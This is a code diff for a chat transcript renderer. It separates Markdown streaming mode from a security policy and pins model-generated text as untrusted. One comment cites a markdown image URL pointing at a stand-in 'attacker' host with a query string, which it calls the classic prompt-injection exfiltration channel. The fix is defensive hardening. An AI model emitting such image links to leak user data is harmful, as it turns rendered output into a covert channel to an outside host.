@@ -65,12 +65,32 @@ const MICRO_LABEL_STYLE = {
 
 // ── Per-type Mantine renderers ────────────────────────────────────────────────
 
-function TextRenderer({ part }: { part: TextPart; index: number }): JSX.Element {
+function TextRenderer({
+  part,
+  settled,
+}: {
+  part: TextPart
+  index: number
+  settled: boolean
+}): JSX.Element {
   // Markdown wraps its output in Prose (a div carrying chat-density typography). It must NOT be
   // wrapped in a Mantine `Text` (renders a `<p>`) — block elements inside a `<p>` are invalid
   // nesting that the browser auto-closes, scrambling spacing.
+  //
+  // TWO independent props, and conflating them is what broke this twice:
+  //
+  // `streaming={!settled}` is the RENDERING mode — NOT a hardcoded `streaming`. Hardcoding it kept
+  // `Markdown` in block-split mode forever, and its tail block is unconditionally unsettled: a
+  // FINISHED message ending in a ```mermaid fence rendered as a CodeBlock permanently, and the last
+  // block of every finished message permanently hid its copy action.
+  //
+  // `contentTrust="untrusted"` is the SECURITY policy, and it is pinned unconditionally. Transcript
+  // text is model-generated whether or not the run is still in flight, and images auto-fetch —
+  // `![](https://attacker/?q=…)` is the classic prompt-injection exfiltration channel. Letting
+  // `streaming` imply the policy meant every SETTLED (i.e. almost every) message silently regained
+  // an open `https://` image allowlist the moment the run finished.
   return (
-    <Markdown streaming density="chat">
+    <Markdown streaming={!settled} contentTrust="untrusted" density="chat">
       {part.text}
     </Markdown>
   )
@@ -102,7 +122,7 @@ function ReasoningRenderer({ part }: { part: ReasoningPart; index: number }): JS
   )
 }
 
-// Thin adapter: PartList's per-type renderer signature is `{ part, index }`, ToolChip's is a
+// Thin adapter: PartList's per-type renderer signature is `{ part, index, settled }`, ToolChip's is a
 // richer `ToolChipProps` (defaultExpanded/onApprove/onDeny) that the built-in AgentPart union has
 // no slot for — a 'tool' part reaching this path is always basalt's own six-variant union, never a
 // consumer-registered one, so there is nowhere upstream to source approve/deny handlers from at
@@ -322,7 +342,12 @@ function MessageBlockImpl({
         </Group>
         {segments.map((segment) =>
           segment.kind === 'agent' ? (
-            <PartList key={segment.key} parts={segment.parts} components={threadPartRenderers} />
+            <PartList
+              key={segment.key}
+              parts={segment.parts}
+              components={threadPartRenderers}
+              settled={settled}
+            />
           ) : (
             <Fragment key={segment.key}>
               {segment.render({
